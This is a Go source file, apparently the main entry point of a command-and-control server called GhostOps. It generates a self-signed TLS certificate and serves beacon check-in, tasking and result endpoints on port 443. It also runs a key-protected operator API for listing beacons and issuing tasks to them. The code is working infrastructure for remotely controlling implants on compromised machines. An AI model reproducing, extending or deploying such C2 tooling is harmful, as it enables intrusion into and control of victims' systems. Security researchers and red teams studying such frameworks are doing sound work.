package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"time"

	"github.com/4w4647/GhostOps/server/banner"
	"github.com/4w4647/GhostOps/server/handlers"
	"github.com/4w4647/GhostOps/server/store"
)

func selfSignedCert() (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}
	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{Organization: []string{"GhostOps"}},
		NotBefore:    time.Now().Add(-time.Minute),
		NotAfter:     time.Now().Add(10 * 365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses:  []net.IP{net.IPv4(0, 0, 0, 0), net.IPv6loopback},
	}
	certDER, err := x509.CreateCertificate(rand.Reader, &tmpl, &tmpl, key.Public(), key)
	if err != nil {
		return tls.Certificate{}, err
	}
	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return tls.Certificate{}, err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	return tls.X509KeyPair(certPEM, keyPEM)
}

func tlsConfig(certFile, keyFile string) (*tls.Config, error) {
	var cert tls.Certificate
	var err error
	if certFile != "" && keyFile != "" {
		cert, err = tls.LoadX509KeyPair(certFile, keyFile)
	} else {
		cert, err = selfSignedCert()
	}
	if err != nil {
		return nil, err
	}
	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}, nil
}

func authMiddleware(key string, next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-API-Key") != key {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func serveTLS(addr string, handler http.Handler, cfg *tls.Config, logger *log.Logger) {
	ln, err := tls.Listen("tcp", addr, cfg)
	if err != nil {
		logger.Fatalf("[!] listen %s: %v", addr, err)
	}
	if err := http.Serve(ln, handler); err != nil {
		logger.Fatalf("[!] serve %s: %v", addr, err)
	}
}

func main() {
	c2Host  := flag.String("c2-host",   "0.0.0.0",  "C2 listener bind address")
	c2Port  := flag.Int("c2-port",     443,          "C2 listener port")
	opHost  := flag.String("op-host",   "127.0.0.1", "Operator API bind address")
	opPort  := flag.Int("op-port",     9090,         "Operator API port")
	certFile := flag.String("tls-cert", "",          "TLS certificate PEM (auto-generated if omitted)")
	keyFile  := flag.String("tls-key",  "",          "TLS private key PEM (auto-generated if omitted)")
	apiKey    := flag.String("api-key",  "",          "Operator API key (auto-generated if omitted)")
	logFile   := flag.String("log",     "",          "log file path (tee stdout + file)")
	storeFile := flag.String("store",   "",          "path to persistence file (disabled if omitted)")
	flag.Parse()

	if *apiKey == "" {
		b := make([]byte, 16)
		rand.Read(b)
		k := hex.EncodeToString(b)
		apiKey = &k
	}

	var logWriter io.Writer = os.Stdout
	if *logFile != "" {
		f, err := os.OpenFile(*logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
		if err != nil {
			log.Fatalf("[!] cannot open log file: %v", err)
		}
		defer f.Close()
		logWriter = io.MultiWriter(os.Stdout, f)
	}
	logger := log.New(logWriter, "", log.LstdFlags)

	cfg, err := tlsConfig(*certFile, *keyFile)
	if err != nil {
		logger.Fatalf("[!] TLS setup failed: %v", err)
	}

	c2Addr := fmt.Sprintf("%s:%d", *c2Host, *c2Port)
	opAddr := fmt.Sprintf("%s:%d", *opHost, *opPort)

	var s *store.Store
	if *storeFile != "" {
		s, err = store.Load(*storeFile)
		if err != nil {
			logger.Fatalf("[!] failed to load store: %v", err)
		}
		logger.Printf("[*] store loaded from %s", *storeFile)
	} else {
		s = store.New()
	}
	c2 := &handlers.C2{Store: s, Log: logger}
	op := &handlers.Operator{Store: s, Log: logger}

	c2Mux := http.NewServeMux()
	c2Mux.HandleFunc("/checkin", c2.Checkin)
	c2Mux.HandleFunc("/tasks/", c2.Tasks)
	c2Mux.HandleFunc("/result", c2.Result)

	opMux := http.NewServeMux()
	opMux.HandleFunc("/beacons", op.List)
	opMux.HandleFunc("/beacons/", op.Get)
	opMux.HandleFunc("/task", op.Task)
	opMux.HandleFunc("/results/", op.Results)

	banner.Print(c2Addr, opAddr, *apiKey)

	go serveTLS(c2Addr, c2Mux, cfg, logger)
	serveTLS(opAddr, authMiddleware(*apiKey, opMux), cfg, logger)
}
